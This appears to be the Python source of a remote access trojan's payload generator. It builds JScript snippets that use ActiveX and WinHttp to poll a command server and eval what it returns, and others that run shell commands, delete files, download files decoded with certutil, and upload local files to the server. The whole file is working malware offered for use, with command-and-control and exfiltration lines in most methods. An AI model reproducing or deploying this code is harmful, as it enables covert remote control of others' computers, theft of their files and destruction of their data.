

class payload():
    def exit(self):
        p = '''
        c="(\"cmd /c taskkill /f /im rundll32.exe\",0,true)";  
        r = new ActiveXObject("WScript.Shell").Run(c);
        '''
        return p
    def connect(self):
        client_payload = '''
        while(true)
        {
            try
            {
                h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                h.SetTimeouts(0, 0, 0, 0);
                h.Open("GET","http://{{server}}/rat/{{signature}}",false);
                h.Send();
                c = h.ResponseText;
                eval(c)
            }
            catch(error)
            {
                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                p.SetTimeouts(0, 0, 0, 0);
                p.Open("POST","http://{{server}}/rat/{{signature}}",false);
                p.Send(error.message);
            }
                                        
        }
        '''
        return client_payload
    def heartbeat(self):
        #ping -n 3 127.0.0.1 > nul
        #timeout /t 3 /nobreak > nul
        p = '''
        function delay(){
            try{
                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                p.Open("GET","http://127.0.0.1:65033/",false);
                p.Send('')
            }catch(err){
            }
        }
        delay()
        delay()
        delay()
        message = "success"
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.Open("GET","http://{{server}}/heartbeat/{{signature}}",false);
        p.Send('');
        '''
        return p
    def cmd(self, command):
        command = command.replace('\\', '\\\\')
        #cmd /c ?
        p = '''
        var message;
        try{
            r = new ActiveXObject("WScript.Shell").Exec("%s");
            while(!r.StdOut.AtEndOfStream){message=r.StdOut.ReadAll()}
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(command)
        return p
    def run(self, command):
        command = command.replace('\\', '\\\\')
        p = '''
        var message;
        try{
            r = new ActiveXObject("WScript.Shell").Run("%s",0,true);
            message = "success"
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(command)
        return p
    def delete(self, path):
        path = path.replace('\\', '\\\\')
        p = '''
        var message;
        try{
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile("%s");
            f.Delete();
            message = "success";
        }catch(err){
            message = err.message
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(path)
        return p
    def download(self, filename, savepath):
        savepath = savepath.replace('\\', '\\\\')
        p = '''
        var message;
        filename = "%s"
        savepath = "%s"
        b64savepath = savepath+".b64"
        try{
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET","http://{{server}}/download?filename="+filename,false);
            g.Send();
            d = g.ResponseText;
            var fso = new ActiveXObject("Scripting.FileSystemObject")
            if (fso.FileExists(b64savepath)) fso.DeleteFile(b64savepath);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.CreateTextFile(b64savepath,true);
            f.WriteLine(d);
            f.Close();
            r = new ActiveXObject("WScript.Shell").Run("certutil -decode "+b64savepath+" "+savepath,0,true);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(b64savepath);
            f.Delete();
            message = "success";
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(filename, savepath)
        return p
    def upload(self, path):
        path = path.replace('\\', '\\\\')
        p = '''
        var message;
        try{
            path = "%s";
            tmp_path = path+".b64"
            var fso = new ActiveXObject("Scripting.FileSystemObject")
            if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
            r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.OpenTextFile(tmp_path,1);
            message=f.ReadAll();
            f.Close();
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
            p.Send(escape(message));
            message = p.ResponseText
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(tmp_path);
            f.Delete();
        }catch(err){
            message = err.message;
        }
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
        p.Send(message);
        '''%(path)
        return p
     